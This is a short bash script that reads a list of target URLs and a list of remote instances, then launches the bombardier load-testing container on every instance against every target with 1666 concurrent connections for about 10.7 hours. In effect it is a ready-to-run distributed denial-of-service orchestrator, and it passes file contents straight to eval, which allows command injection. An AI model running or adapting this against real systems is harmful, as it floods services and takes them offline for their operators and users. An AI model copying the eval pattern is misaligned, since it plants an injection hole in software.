#!/bin/bash

if [ -f .env ]
then
  export $(cat .env | sed 's/#.*//g' | xargs)
fi

targets_list="targets.txt"
instances_ip="instances_ip.txt"
while IFS= read -r target
do
  while IFS= read -r instance
  do
    command="sudo docker run -d -it --rm alpine/bombardier -c 1666 -d 38600s -l $target"
    echo "$instance '$command' < /dev/null"
    eval "$instance '$command' < /dev/null"
  done < "$instances_ip"
done < "$targets_list"